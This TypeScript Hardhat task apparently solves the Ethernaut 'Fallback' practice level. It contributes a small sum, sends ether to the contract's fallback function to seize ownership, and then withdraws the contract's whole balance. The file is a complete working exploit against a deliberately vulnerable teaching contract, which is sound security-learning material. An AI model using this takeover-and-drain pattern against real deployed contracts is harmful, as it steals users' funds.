import { task, types } from "hardhat/config";
import { ContractTransaction } from "ethers";
import { Fallback } from "../../typechain";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/dist/src/signer-with-address";
import { TASK_WITHDRAW } from "../task-names";
import { Network } from "@ethersproject/networks/lib/types";
import { BigNumber } from "@ethersproject/bignumber";

task(TASK_WITHDRAW, "Withdraw from Contract")
  .setAction(async (_taskArgs, hre) => {
    const abi = [
      'function contribute() public payable',
      'function withdraw() public',
    ]

    let userWallet: SignerWithAddress;

    [userWallet] = await hre.ethers.getSigners();
    const address = await userWallet.getAddress();
    console.log(`user address: ${address}`);

    const network: Network = await hre.ethers.provider.getNetwork();
    console.log(`network: ${network.name}`);

    var contractAddress = "";
    if (network.name === "rinkeby") {
      contractAddress = process.env.RINKEBY_CONTRACT_ADDRESS || '';
    } else if (network.name === "unknown") { //localhost network
      contractAddress = process.env.LOCALHOST_CONTRACT_ADDRESS || '';
    }
    console.log(`contractAddress: ${contractAddress}`);

    const contract: Fallback = new hre.ethers.Contract(contractAddress, abi, userWallet) as Fallback;

    // User contributes small amount
    const smallContribution: BigNumber = hre.ethers.BigNumber.from("100000000000000");
    await contract.connect(userWallet).contribute({ value: smallContribution });

    // User calls fallback function to become owner
    const takeoverownerContribution: BigNumber = hre.ethers.BigNumber.from("100000000000000");
    await userWallet.sendTransaction({ to: contract.address, value: takeoverownerContribution, gasLimit: 30000 });

    // Alternate way of calling the fallback
    //await contract.connect(userWallet).fallback({ value: takeoverownerContribution });

    // User withdraws from contract
    const receipt: ContractTransaction = await contract.connect(userWallet).withdraw();
    console.log(receipt);

    process.exit(0)
  });